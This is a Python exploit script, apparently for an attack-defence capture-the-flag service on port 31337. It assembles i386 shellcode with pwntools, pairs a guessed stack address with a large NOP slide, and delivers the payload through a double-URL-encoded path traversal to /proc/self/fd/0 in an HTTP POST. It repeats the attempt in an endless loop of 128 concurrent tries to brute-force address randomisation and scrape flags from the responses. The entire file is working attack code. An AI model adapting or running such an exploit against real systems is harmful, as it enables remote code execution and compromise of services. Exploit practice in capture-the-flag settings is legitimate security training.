#!/usr/bin/env python3

from gevent import monkey
monkey.patch_all()

import sys
import requests
import urllib.parse
import socket
import re
import time
import gevent
import gevent.pool
import random
from random import randint as R
from pwnlib import shellcraft
from pwnlib.util.packing import p32
from pwnlib.util.cyclic import cyclic
from pwnlib.asm import asm

ip = sys.argv[1]
hint = sys.argv[2]
flag_re = rb"[A-Z0-9]{31}="

def urlencode1(s):
    ret = ""
    for i in s:
        ret += f"%{hex(ord(i))[2:].zfill(2)}"
    return ret

def urlencode2(s):
    return urllib.parse.quote_plus(s)

def due(s):
    return urlencode2(urlencode1(s))

skip_4_bytes = asm("""
    jmp a
    inc eax
    inc eax
    inc eax
    inc eax
a:
""").replace(asm("inc eax"), b"\x00")

def nop_slide(s):
    pad = b"\x90" * 307 + skip_4_bytes + b"\x90" * 30000
    return pad[:21000 - len(s)] + s

guc_offset = 0x56556778 - 0x56555000
ret200 = 0x56556dee - 0x56555000

shellcode  = ""
shellcode += "mov esi, 0x57000000\n"
shellcode += "lp:\n"

shellcode += shellcraft.i386.push(0)
shellcode += shellcraft.i386.push(-1)
shellcode += shellcraft.i386.push(34)
shellcode += shellcraft.i386.push(3)
shellcode += shellcraft.i386.push(4096)
shellcode += shellcraft.i386.push('esi')
shellcode += shellcraft.i386.syscall(90, 'esp')
shellcode += "add esp, 24\n"
shellcode += "cmp eax, esi\n"

shellcode += "jnz elp\n"
shellcode += "sub esi, 0x1000\n"
shellcode += "jmp lp\n"
shellcode += "elp:\n"

shellcode += "sub esi, 0x6000\n"

shellcode += shellcraft.i386.pushstr(hint)
shellcode += "push esi\n"
shellcode += f"add esi, {guc_offset}\n"
shellcode += "mov ecx, esp\n"
shellcode += "add ecx, 4\n"
shellcode += "call esi\n"

shellcode += "pop esi\n"
shellcode += f"add esi, {ret200}\n"
shellcode += "call esi\n"

shellcode = asm(shellcode)

al = "0123456789abcdef"

def try_attack(n):
    stack = int("ff*+-000" \
        .replace("*", al[R(0, len(al) - 1)]) \
        .replace("+", al[R(0, len(al) - 1)]) \
        .replace("-", al[R(0, len(al) - 1)]), 16)

    payload = b"A" * 16
    payload += p32(stack)
    payload += nop_slide(shellcode)

    data  = b""
    data += f"POST /static/{due('../../../proc/self/fd/0')} HTTP/1.1\r\n".encode()
    data += f"Host: {ip}:31337\r\n".encode()
    data += (b"Kekmeister: " + b"\x90" * 200 + b"\r\n") * 100
    data += f"Content-Length: {len(payload)}\r\n\r\n".encode()
    data += payload

    s = socket.socket()
    s.connect((ip, 31337))
    s.sendall(data)

    time.sleep(5)
    r = s.recv(30000)
    s.close()

    flags = re.findall(flag_re, r)

    if len(flags) > 0:
        print(flags)
    else:
        print(f'Attack {n}')

pool = gevent.pool.Pool(128)

cnt = 0

while True:
    cnt += 1
    pool.spawn(try_attack, cnt)
